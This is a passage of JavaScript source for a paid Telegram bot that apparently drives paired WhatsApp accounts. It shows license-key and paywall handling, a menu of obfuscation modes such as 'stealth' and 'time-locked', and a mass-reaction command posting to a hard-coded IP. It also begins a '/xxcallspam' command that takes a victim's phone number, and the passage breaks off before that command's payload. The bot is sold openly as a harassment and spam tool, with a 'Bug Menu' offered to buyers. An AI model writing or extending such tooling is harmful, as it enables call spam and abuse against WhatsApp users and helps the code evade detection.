  // If owner and wants new key → allow
  try {
    const resp = await axios.post(`http://127.0.0.1:${CONFIG.API_PORT}/generatekey`, {
      telegramId: senderId,
      days,
      senderId,
      isOwner: isOwner
    });

    if (resp.data.success) {
      await userBot.sendMessage(chatId, `✅ New Key Generated Successfully!\n\n<code>${resp.data.key}</code>\nExpiry: ${new Date(resp.data.expiry).toLocaleDateString()}`, { parse_mode: 'HTML' });
    } else {
      await userBot.sendMessage(chatId, `❌ ${resp.data.message || "Failed to generate key"}`);
    }
  } catch (e) {
    console.error(e);
    await userBot.sendMessage(chatId, "❌ Failed to connect to license server.");
  }
});

botInstance.onText(/\/delkey(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  const isOwner = CONFIG.owner.includes(senderId);
  const isReseller = db.OwnerUsers.includes(senderId);
  const isVip = await hasVipAccess(senderId, userBot);

  if (!isOwner && !isReseller && !isVip) {
    return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
  }

  const providedKey = match[1]?.trim();

  if (providedKey) {
    // Specific key deletion
    if (!licenseDB[providedKey]) {
      return userBot.sendMessage(chatId, "❌ Key not found.");
    }

    const keyOwner = licenseDB[providedKey].telegramId;

    if (!isOwner && keyOwner !== senderId) {
      return userBot.sendMessage(chatId, "❌ You can only delete your own key.");
    }

    delete licenseDB[providedKey];
    saveJson('./database/licenses.json', licenseDB);

    return userBot.sendMessage(chatId, `✅ Key successfully deleted:\n<code>${providedKey}</code>`, { parse_mode: 'HTML' });
  } 
  else {
    // No argument provided
    const userKeys = Object.keys(licenseDB).filter(k => licenseDB[k].telegramId === senderId);

    if (userKeys.length === 0) {
      return userBot.sendMessage(chatId, "❌ You don't have any active keys.");
    }

    if (userKeys.length === 1) {
      const keyToDelete = userKeys[0];
      delete licenseDB[keyToDelete];
      saveJson('./database/licenses.json', licenseDB);
      return userBot.sendMessage(chatId, `✅ Your key has been deleted:\n<code>${keyToDelete}</code>`, { parse_mode: 'HTML' });
    }

    // Multiple keys (mainly for Owner)
    let text = `🗑️ You have <b>${userKeys.length}</b> keys.\n\n`;
    
    userKeys.forEach((key, i) => {
      const data = licenseDB[key];
      const expiry = new Date(data.expiry).toLocaleDateString('en-GB');
      text += `${i+1}. <code>${key}</code> (Expires: ${expiry})\n`;
    });

    text += `\nUse: /delkey &lt;full_key&gt; to delete a specific one.`;

    return userBot.sendMessage(chatId, text, { parse_mode: 'HTML' });
  }
});

botInstance.onText(/\/listkey/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  const isOwner = CONFIG.owner.includes(senderId);

  if (!isOwner) {
    return userBot.sendMessage(chatId, "❌ Only Owner can list all keys.");
  }

  if (Object.keys(licenseDB).length === 0) {
    return userBot.sendMessage(chatId, "❌ No active keys found.");
  }

  let text = `<b>📋 All Active License Keys</b>\nTotal: <b>${Object.keys(licenseDB).length}</b>\n\n`;
  let count = 1;

  for (const [key, data] of Object.entries(licenseDB)) {
    const userLink = await formatUserLink(userBot, data.telegramId);
    const expiryDate = new Date(data.expiry).toLocaleDateString('en-GB');
    const createdByLink = await formatUserLink(userBot, data.createdBy || data.telegramId);
    const isBound = data.hwid ? "✅ Bound" : "⭕ Not Bound";
    const status = data.revoked ? "🚫 Revoked" : "✅ Active";

    text += `${count++}. ${userLink}\n`;
    text += `   <code>${key}</code>\n`;
    text += `   Expiry: ${expiryDate}\n`;
    text += `   Status: ${status} | ${isBound}\n`;
    text += `   Created by: ${createdByLink}\n\n`;

    if (text.length > 3800) {
      await userBot.sendMessage(chatId, text, { parse_mode: 'HTML', disable_web_page_preview: true });
      text = '';
    }
  }

  if (text) {
    await userBot.sendMessage(chatId, text, { parse_mode: 'HTML', disable_web_page_preview: true });
  }
});
// ====================== END LICENSE COMMANDS ======================

botInstance.onText(/^\/idemoji(?:@\w+)?$/i, async (msg) => {
  const chatId = msg.chat.id;
  const userBot = getUserBot(botInstance); // your helper to pick correct bot instance
const senderId = msg.from.id;

const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;
  
  if (!checkRateLimit(senderId, chatId)) return;
  
  // NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  // Must be a reply
  if (!msg.reply_to_message) {
    await userBot.sendMessage(chatId, "❌ Please reply or quote a message that contains emoji(s).", {
      reply_to_message_id: msg.message_id,
    });
    return;
  }

  const replied = msg.reply_to_message;
  const lines = [];

  // 1. Check entities (custom emoji)
  const entities = replied.entities || replied.caption_entities || [];
  for (const ent of entities) {
    if (ent.type === 'custom_emoji' && ent.custom_emoji_id) {
      // Extract the actual displayed emoji (slice from text/caption)
      const textSource = replied.text || replied.caption || '';
      const emojiChar = textSource.slice(ent.offset, ent.offset + ent.length);

      lines.push(`${emojiChar} = <code>${ent.custom_emoji_id}</code>`);
    }
  }

  // 2. If no custom emoji found → fallback to regular emoji chars
  if (lines.length === 0) {
    const text = (replied.text || replied.caption || '').trim();
    if (!text) {
      await userBot.sendMessage(chatId, "❌ No text/emoji found in the replied message.", {
        reply_to_message_id: msg.message_id,
      });
      return;
    }

    // Very basic: split into characters, filter emoji-like ones
    // (you can improve with a real emoji regex if needed)
    for (const char of text) {
      // Rough emoji range check (not perfect, but good enough)
      if (/[\p{Emoji}\p{Emoji_Modifier}\p{Emoji_Component}]/u.test(char)) {
        lines.push(`${char} = <code>regular (no custom ID)</code>`);
      }
    }
  }

  if (lines.length === 0) {
    await userBot.sendMessage(chatId, "❌ No emoji (custom or regular) detected in the replied message.", {
      reply_to_message_id: msg.message_id,
    });
    return;
  }

  // Format nice reply
  const response = lines.join('\n');

  await userBot.sendMessage(chatId, `Emoji ID(s):\n\n${response}`, {
    parse_mode: 'HTML',
    reply_to_message_id: msg.message_id,
  });
});

// Standard
bot.onText(/^\/enc(?:\s+(low|medium|high))?/i, (msg, match) => {
    const level = (match[1] || 'high').toLowerCase();
    handleObfusCommand(msg, () => getObfuscationConfig(level), `Standard (${level})`);
});

bot.onText(/^\/eval(?:\s+(low|medium|high))?/i, (msg, match) => {
    const level = (match[1] || 'high').toLowerCase();
    handleObfusCommand(msg, () => getObfuscationConfig(level), `Eval + Obfus (${level})`);
});

// Styles
bot.onText(/^\/china$/i, msg => handleObfusCommand(msg, getMandarinObfuscationConfig(), "Mandarin Style"));
bot.onText(/^\/arab$/i, msg => handleObfusCommand(msg, getArabObfuscationConfig(), "Arabic Style"));
bot.onText(/^\/japan$/i, msg => handleObfusCommand(msg, getJapanObfuscationConfig(), "Japanese Style"));
bot.onText(/^\/japanxarab$/i, msg => handleObfusCommand(msg, getJapanxArabObfuscationConfig(), "Japan x Arab"));
bot.onText(/^\/stealth$/i, msg => handleObfusCommand(msg, getInvisObfuscationConfig(), "Invisible Mode"));
bot.onText(/^\/bes64$/i, msg => handleObfusCommand(msg, getXObfuscationConfig(), "X Invisible", { invisible: true }));
bot.onText(/^\/nou$/i, msg => handleObfusCommand(msg, getNewObfuscationConfig(), "Advanced Layer"));
bot.onText(/^\/fortress$/i, msg => handleObfusCommand(msg, getStrongObfuscationConfig(), "Power Fortress"));
bot.onText(/^\/uprotect$/i, msg => handleObfusCommand(msg, getUltraObfuscationConfig(), "Ultra Protection"));
bot.onText(/^\/nebula$/i, msg => handleObfusCommand(msg, getNebulaObfuscationConfig(), "Nebula Polymorphic"));
bot.onText(/^\/nova$/i, msg => handleObfusCommand(msg, getNovaObfuscationConfig(), "Nova Dynamic"));
bot.onText(/^\/siu$/i, msg => handleObfusCommand(msg, getSiuCalcrickObfuscationConfig(), "Siu Calcrick"));
bot.onText(/^\/quantum$/i, msg => handleObfusCommand(msg, null, "Quantum Vortex", { special: 'quantum' }));
bot.onText(/^\/obaileys$/i, msg => handleObfusCommand(msg, getBaileysObfuscationConfig(), "Baileys"));

// Time-locked
bot.onText(/^\/timez\s+(\d+)$/i, (msg, match) => {
    const days = parseInt(match[1]);
    if (days < 1 || days > 365) return bot.sendMessage(msg.chat.id, "Days must be 1-365");
    handleObfusCommand(msg, null, `Time-Locked (${days} days)`, { special: 'timelocked', days });
});

// Max intensity
bot.onText(/^\/max\s+(\d+)$/i, (msg, match) => {
    const intensity = Math.min(10, Math.max(1, parseInt(match[1])));
    handleObfusCommand(msg, (i) => getMaxObfuscationConfig(i), `Max Intensity ${intensity}`, { param: intensity });
});

// Big size (complete with padding)
bot.onText(/^\/big\s+(\d+)$/i, (msg, match) => {
    const mb = Math.max(1, parseInt(match[1]));
    handleObfusCommand(msg, getBigObfuscationConfig(), `Big Size (${mb}MB)`, { bigSize: mb });
});

// Custom name
bot.onText(/^\/custom\s+(.+)$/i, (msg, match) => {
    const name = match[1].replace(/[^a-zA-Z0-9_]/g, "");
    if (!name) return bot.sendMessage(msg.chat.id, "Invalid custom name");
    handleObfusCommand(msg, (n) => getCustomObfuscationConfig(n), `Custom (${name})`, { param: name });
});

bot.onText(/^\/deobfuscate$/i, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!CONFIG.owner.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Deobfuscation is owner-only.");
    }

    if (!msg.reply_to_message || !msg.reply_to_message.document || !msg.reply_to_message.document.file_name.endsWith('.js')) {
        return bot.sendMessage(chatId, "❌ Reply to an obfuscated .js file!");
    }

    const file = msg.reply_to_message.document;
    const progressMsg = await bot.sendMessage(chatId, "```css\n🔓 Deobfuscating... (0%)\)\n▱▱▱▱▱▱▱▱▱▱\n```", { parse_mode: 'Markdown' });

    const updateProgress = async (p, s) => {
        const bar = createProgressBar(p);
        await bot.editMessageText(`\`\`\`css\n🔓 Deobfuscate\n${p === 100 ? "✅ Done" : "⚙️ " + s} (${p}%)\n${bar}\n\`\`\``, {
            chat_id: chatId,
            message_id: progressMsg.message_id,
            parse_mode: 'Markdown'
        });
    };

    try {
        await updateProgress(20, "Downloading");
        const fileInfo = await bot.getFile(file.file_id);
        const fileLink = `https://api.telegram.org/file/bot${CONFIG.botToken}/${fileInfo.file_path}`;
        const response = await fetch(fileLink);
        const content = await response.text();

        await updateProgress(50, "Deobfuscating");
        const result = await webcrack(content);
        let deob = result.code || content;
        if (result.bundle) deob = "// Bundled code detected\n" + deob;

        const tempPath = path.join(__dirname, `deob-${Date.now()}-${file.file_name}`);
        await fse.writeFile(tempPath, deob);
        await updateProgress(90, "Sending");

        await bot.sendDocument(chatId, tempPath, {
            caption: "✅ Deobfuscation complete!",
            filename: `deobfuscated-${file.file_name}`
        });

        await updateProgress(100, "Done");
        await fse.remove(tempPath);
    } catch (err) {
        bot.sendMessage(chatId, `❌ Error: ${err.message}`);
    }
});

bot.onText(/^\/obfus$/i, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Owner-only check
    if (!CONFIG.owner.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ This command is restricted to bot owners only.");
    }

    const caption = `
╭━━━「 OBFUS MENU 」━━━⬣
│ 
│ Author : ${CONFIG.usertele}
│ Status : Owner-Only Feature
│
├━━━「 STANDARD 」━━━⬣
│ /enc <low|medium|high> - Standard Obfuscation
│ /eval <low|medium|high> - Eval + Obfuscate
├━━━「 STYLES 」━━━⬣
│ /china - Mandarin Style
│ /arab - Arabic Style
│ /japan - Japanese Style
│ /japanxarab - Japan x Arab Style
│ /stealth - Invisible Mode
│ /bes64 - X Invisible Base64
│ /nou - Advanced Layer
│ /fortress - Power Fortress
│ /uprotect - Ultra Protection
│ /nebula - Nebula Polymorphic
│ /nova - Nova Dynamic
│ /siu - Siu Calcrick Chaos
│ /quantum - Quantum Vortex
│ /timez <days> - Time-Locked (1-365)
├━━━「 CUSTOM 」━━━⬣
│ /max <1-10> - Max Intensity
│ /big <mb> - Big Size Padding
│ /custom <name> - Custom Identifier
├━━━「 DEOBFUSCATE 」━━━⬣
│ /deobfuscate - Deobfuscate File
╰━━━━━━━━━━━━━━━━⬣
    `;

    bot.sendMessage(chatId, caption, { parse_mode: 'Markdown' });
});

botInstance.onText(/\/7eiwjdjd(?:\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  // NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  // === REACTWA SPECIFIC 15-MINUTE COOLDOWN (owners exempt) ===
  if (!CONFIG.owner.includes(senderId)) {
    const lastUsed = reactwaRateLimit.get(senderId) || 0;
    const timeLeft = REACTWA_COOLDOWN_MS - (Date.now() - lastUsed);
    if (timeLeft > 0) {
      const minutes = Math.floor(timeLeft / 60000);
      const seconds = Math.floor((timeLeft % 60000) / 1000);
      return userBot.sendMessage(chatId, `⏰ Cooldown active. Please wait ${minutes}m ${seconds}s before using /reactwa again.`);
    }
  }

  if (!match[1] || match[1].trim() === '') {
    return userBot.sendMessage(chatId, 
      '❌ Usage: /reactwa <link> <emojis>\n\n' +
      'Examples:\n' +
      '• /reactwa https://whatsapp.com/channel/... 🔥 ❤️ 👍\n' +
      '• /reactwa https://whatsapp.com/channel/... 🔥,❤️,👍\n' +
      '• /reactwa https://whatsapp.com/channel/... 🎄😆😵‍💫\n' +
      '• /reactwa https://whatsapp.com/channel/... 🥳 🎉  🚀'
    );
  }

  const args = match[1].trim().split(/\s+/);
  if (args.length < 2) {
    return userBot.sendMessage(chatId, '❌ Please provide both the WhatsApp channel link and at least one emoji');
  }

  let link = args[0];
  const emojiPart = args.slice(1).join(' ').trim();

  // Basic link validation
  if (!link.startsWith('https://whatsapp.com/channel/') && 
      !link.startsWith('https://chat.whatsapp.com/')) {
    return userBot.sendMessage(chatId, '❌ Invalid WhatsApp channel link format.\nMust start with https://whatsapp.com/channel/ or https://chat.whatsapp.com/');
  }

  // ── Improved Emoji parsing ───────────────────────────────────────────────
  let emojis = [];

  // Case 1: Contains commas → split by comma (classic style)
  if (emojiPart.includes(',')) {
    emojis = emojiPart.split(',')
      .map(e => e.trim())
      .filter(e => e.length > 0);
  } 
  // Case 2: No commas → try space separated first, then fallback to emoji boundary split
  else {
    const cleaned = emojiPart.replace(/\s+/g, ' ').trim(); // normalize multiple spaces

    // Most common: space-separated emojis
    if (cleaned.includes(' ')) {
      emojis = cleaned.split(' ')
        .map(e => e.trim())
        .filter(e => e.length > 0);
    } 
    // No spaces → probably stuck together → try unicode emoji splitting
    else {
      emojis = cleaned
        .split(/(?=\p{Emoji_Presentation}|\p{Extended_Pictographic})/gu)
        .filter(e => e && /\p{Emoji}/u.test(e));

      // Ultimate fallback: treat whole input as single emoji
      if (emojis.length === 0 && cleaned.length > 0) {
        emojis = [cleaned];
      }
    }
  }

  if (emojis.length === 0) {
    return userBot.sendMessage(chatId, '❌ Could not detect any valid emojis');
  }

  // Optional: remove duplicates and limit maximum emojis
  emojis = [...new Set(emojis)]; // remove duplicates
  if (emojis.length > 12) {
    emojis = emojis.slice(0, 12);
    await userBot.sendMessage(chatId, '⚠️ Too many emojis → limited to first 12');
  }

  // Send waiting message
  const waitingMsg = await userBot.sendMessage(chatId, '⏳ Sending reactions... please wait');

  try {
    const response = await fetch('http://167.172.170.218:9000/api/massreact', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        postUrl: link,
        emojis: emojis.join(',')          // ←─── THIS IS THE IMPORTANT CHANGE
      })
    });

    const data = await response.json();

    if (response.ok && data.success === true) {
      await userBot.editMessageText(
        `✅ Success!\nSent ${emojis.length} reaction${emojis.length === 1 ? '' : 's'}`,
        {
          chat_id: chatId,
          message_id: waitingMsg.message_id
        }
      );

      // === SET COOLDOWN ONLY ON SUCCESS (owners already bypassed above) ===
      reactwaRateLimit.set(senderId, Date.now());

    } else {
      await userBot.editMessageText(
        `❌ Failed: ${data.message || 'Unknown error from API'}`,
        {
          chat_id: chatId,
          message_id: waitingMsg.message_id
        }
      );
    }
  } catch (error) {
    console.error('reactwa command error:', error);

    let errorText = '❌ An error occurred while sending reactions';
    if (error.message?.includes('timeout')) {
      errorText = '❌ Request timed out - API might be slow right now';
    }

    try {
      await userBot.editMessageText(errorText, {
        chat_id: chatId,
        message_id: waitingMsg.message_id
      });
    } catch (editError) {
      // Fallback if message was deleted or edit failed
      await userBot.sendMessage(chatId, errorText);
    }
  }
});
// ============== BAN COMMANDS ==============
  botInstance.onText(/\/addban(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    if (!CONFIG.owner.includes(senderId)) {
      return getUserBot(botInstance).sendMessage(chatId, 'Only the bot owner can ban users.');
    }

    if (!match[1]) {
      return getUserBot(botInstance).sendMessage(chatId, 'Usage: /addban <userID>');
    }

    const targetId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
    if (isNaN(targetId)) return getUserBot(botInstance).sendMessage(chatId, 'Invalid user ID.');

    if (db.bannedUsers.includes(targetId)) {
      return getUserBot(botInstance).sendMessage(chatId, `User ${targetId} is already banned.`);
    }

    db.bannedUsers.push(targetId);
    saveJson('./database/banned.json', db.bannedUsers);
    migratePremiumDB();
    cleanBannedFromAll();

    await getUserBot(botInstance).sendMessage(chatId, `User ${targetId} has been permanently banned.`);
  });

  botInstance.onText(/\/delban(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    if (!CONFIG.owner.includes(senderId)) {
      return getUserBot(botInstance).sendMessage(chatId, 'Only the bot owner can unban users.');
    }

    if (!match[1]) {
      return getUserBot(botInstance).sendMessage(chatId, 'Usage: /delban <userID>');
    }

    const targetId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
    if (isNaN(targetId)) return getUserBot(botInstance).sendMessage(chatId, 'Invalid user ID.');

    if (!db.bannedUsers.includes(targetId)) {
      return getUserBot(botInstance).sendMessage(chatId, `User ${targetId} is not banned.`);
    }

    db.bannedUsers = db.bannedUsers.filter(id => id !== targetId);
    saveJson('./database/banned.json', db.bannedUsers);

    await getUserBot(botInstance).sendMessage(chatId, `User ${targetId} has been unbanned.`);
  });

botInstance.onText(/\/listban/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (msg.chat.type !== 'private') return;
  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;
  const userBot = getUserBot(botInstance);
  if (!CONFIG.owner.includes(senderId)) return userBot.sendMessage(chatId, 'Only owner can use this command.');
  if (db.bannedUsers.length === 0) return userBot.sendMessage(chatId, 'No banned users found.');

  const parts = [];
  let text = `<b>┌──────┤ Banned Users List ├──────┐</b>\n\nTotal: <b>${db.bannedUsers.length}</b>\n\n`;
  let count = 0;

  for (const userId of db.bannedUsers) {
    count++;
    const userLink = await formatUserLink(userBot, userId, true);

    const line = `${count}. ${userLink}\n   <b>ID:</b> <code>${userId}</code>\n\n`;

    if (text.length + line.length > 3900) {
      text += '<b>└────────────────────────┘</b>';
      parts.push(text);
      text = `<b>┌──────┤ Banned Users List (Part ${parts.length + 2}) ├──────┐</b>\n\n`;
    }
    text += line;
  }
  text += '<b>└────────────────────────┘</b>';
  parts.push(text);

  for (const p of parts) {
    await userBot.sendMessage(chatId, p, { parse_mode: 'HTML', disable_web_page_preview: true });
    await sleep(300);
  }
});

// ==================== IMPROVED BROADCAST COMMAND (/bc) ====================
botInstance.onText(/\/bc$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Debug log so we always know the command was received
  console.log(`[BC] /bc received from ${senderId} (${msg.from.username || 'no-username'}) at ${new Date().toISOString()}`);

  if (!CONFIG.owner.includes(senderId)) {
    console.log(`[BC] Unauthorized: ${senderId}`);
    return;
  }

  // Very safe reply check - prevents the classic silent crash
  if (!msg.reply_to_message || !msg.reply_to_message.message_id) {
    console.log(`[BC] No valid reply_to_message`);
    return botInstance.sendMessage(chatId, 
      '❌ You must *reply* to a message to broadcast it.\n\n' +
      'Reply → then type /bc'
    );
  }

  const replyId = msg.reply_to_message.message_id;
  console.log(`[BC] Broadcasting reply message_id = ${replyId}`);

  const userBot = getUserBot(botInstance);
  if (!userBot) {
    console.error(`[BC] getUserBot returned null/undefined`);
    return botInstance.sendMessage(chatId, '❌ Internal error: Bot instance unavailable.');
  }

  // Safe user list extraction
  const targets = db.userNumbers && typeof db.userNumbers === 'object' 
    ? Object.keys(db.userNumbers) 
    : [];

  const targetUserIds = targets.filter(id => parseInt(id) !== senderId);

  if (targetUserIds.length === 0) {
    return userBot.sendMessage(chatId, 'No users to broadcast to.');
  }

  await userBot.sendMessage(chatId, 
    `<b>Broadcast started → ${targetUserIds.length} users…</b>`, 
    { parse_mode: 'HTML' }
  );

  let success = 0;
  let failed = 0;

  for (const uid of targetUserIds) {
    try {
      await userBot.copyMessage(uid, chatId, replyId, {
        disable_notification: true
      });
      success++;
    } catch (err) {
      failed++;
      console.log(`BC failed to ${uid}: ${err.message}`);
      // Optional: handle rate-limit
      if (err.response?.statusCode === 429) {
        const wait = (err.response.body?.parameters?.retry_after || 30) + 2;
        await sleep(wait * 1000);
      }
    }
    await sleep(1100); // gentle delay
  }

  await userBot.sendMessage(chatId, `
<b>Finished!</b>
Success: ${success}
Failed: ${failed}
Total: ${targetUserIds.length}
  `, { parse_mode: 'HTML' });
});

  botInstance.onText(/\/start|menu(?:\s(.+))?/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (msg.chat.type !== 'private') return;

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
const hasVip = await hasVipAccess(senderId, userBot);
let status = 'Free User';
if (CONFIG.owner.includes(senderId)) status = 'Owner';
else if (hasVip) status = 'Vip User';

  const caption = `
┌────┤ ${CONFIG.botname} ├───┐
│➻ Name: ${senderName}
│➻ Developer: ${CONFIG.usertele}
│➻ Status: ${status}
│➻ Online: ${getOnlineDuration()}
│➻ RAM: ${getFormattedRAM()}
│➻ CPU: ${getCPUInfo()}
└───────────────────────┘
┌────┤ Press Button Menu ├───┐
└───────────────────────┘
`;

  await userBot.sendPhoto(chatId, CONFIG.pfp, {
    caption,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [
          { text: '〢Bug Menu', callback_data: 'bugmenu' },
          { text: '〢Misc Menu', callback_data: 'miscmenu' },
        ],
          [
    { text: '〢App Menu', callback_data: 'appmenu' },
  ],
        [{ text: '〢Channel', url: CONFIG.CHANNEL_INVITE_LINK }],
               [{ text: '〢Group', url: CONFIG.GROUP_LINK }],
      ],
    },
  });
});

// Save every user who ever sends any message (even just /start)
botInstance.on('message', (msg) => {
  if (msg.chat.type !== 'private') return;

  const userId = msg.from.id;

  // Create the entry if it doesn't exist yet
  if (!db.userNumbers[userId]) {
    db.userNumbers[userId] = null; // null = no WhatsApp number paired yet
    saveJson('./database/user_numbers.json', db.userNumbers);
  }
});

        botInstance.onText(/\/reqpair(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

    // === STRICT LOCK + ONLY 1 NUMBER PER USER ===
    if (pairingLocks.has(senderId)) {
      return userBot.sendMessage(chatId, `⏳ Pairing is already being processed.\nPlease wait a moment.`);
    }

    // Check if user already has an active session
    const existingNumber = db.userNumbers[senderId];
    if (existingNumber) {
      return userBot.sendMessage(chatId, 
        `❌ You already have an active WhatsApp number: *${existingNumber}*\n\nUse /delpair first before pairing a new number.`, 
        { parse_mode: 'Markdown' });
    }

    if (!match?.[1]?.trim()) {
      return userBot.sendMessage(chatId, 'Provide a phone number.\nExample: `/reqpair +12345678900`', { parse_mode: 'Markdown' });
    }

    let numberTarget = match[1].trim().replace(/[^0-9+]/g, '').replace(/^\+/, '');
    if (numberTarget.startsWith('08')) numberTarget = '62' + numberTarget.slice(1);

    if (numberTarget.length < 10) {
      return userBot.sendMessage(chatId, '❌ Invalid phone number.');
    }

    pairingLocks.set(senderId, true);

    const waitMsg = await userBot.sendMessage(chatId, '⏳ Processing pairing...');

    try {
      await getSessionsImproved(userBot, chatId, senderId, numberTarget);
    } catch (err) {
      console.error(`Reqpair error for ${senderId}:`, err.message);
      await userBot.sendMessage(chatId, `❌ Pairing failed: ${err.message}`);
    } finally {
      setTimeout(() => pairingLocks.delete(senderId), 90 * 1000);
    }
  });

      botInstance.onText(/\/delpair/, async (msg) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

    const currentNumber = db.userNumbers[senderId];
    if (!currentNumber) {
      // Clear stuck lock if any
      if (pairingLocks.has(senderId)) pairingLocks.delete(senderId);
      return userBot.sendMessage(chatId, '❌ You dont have any active WhatsApp session.');
    }

    try {
      const sock = sessions.get(currentNumber);
      if (sock && typeof sock.logout === 'function') {
        await sock.logout().catch(() => {});
      }

      const sessionDir = path.join(sessionRoot, `${sanitizePath(currentNumber)}@s.whatsapp.net`);
      await deleteFolderRecursive(sessionDir);

      delete db.userNumbers[senderId];
      saveJson('./database/user_numbers.json', db.userNumbers);
      sessions.delete(currentNumber);
      whatsappStatusMap.delete(currentNumber);

      // Clear lock
      pairingLocks.delete(senderId);

      await userBot.sendMessage(chatId, `✅ WhatsApp session for *${currentNumber}* has been deleted successfully.`, { parse_mode: 'Markdown' });

    } catch (error) {
      console.error(`Delpair error:`, error.message);
      await userBot.sendMessage(chatId, `❌ Failed to delete session: ${error.message}`);
    }
  });
  
  // Register the /callspam command
botInstance.onText(/\/xxcallspam(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /callspam raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /callspam input: match[1] = "${match[1]}"`);

  if (!match[1] || match[1].trim() === '') {
    console.log(`[DEBUG] /callspam: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /callspam +919876543210');
  }

  const rawTarget = match[1].trim();
  console.log(`[DEBUG] /callspam: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /callspam: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /callspam: numberTarget = "${numberTarget}"`);

